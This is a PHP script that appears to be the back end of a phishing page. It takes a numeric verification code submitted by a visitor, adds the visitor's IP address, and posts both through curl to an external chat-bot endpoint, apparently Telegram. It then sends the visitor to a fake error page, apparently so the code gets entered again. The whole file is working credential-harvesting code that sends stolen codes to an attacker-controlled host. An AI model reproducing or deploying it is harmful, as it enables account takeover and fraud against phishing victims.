<?php

include 'access.php';
include 'getip.php';


//First form data
$code = $_POST['code'];

if (is_numeric($code)) {
  //call the ip function to get the guest ip
$ip = getRealIP();
//Setting the message
$text = "Data:\nCodigo: \n".$code."\nIP: ".$ip."\n\nEND";
$msg = $text;

if (!empty($code)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlMsg);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
    
    header('Location: ../error.php');
}else{
    header('Location: ../verify.php');
}  
}else{
    header('Location: ../verify-error-code-confirm.php');
}



?>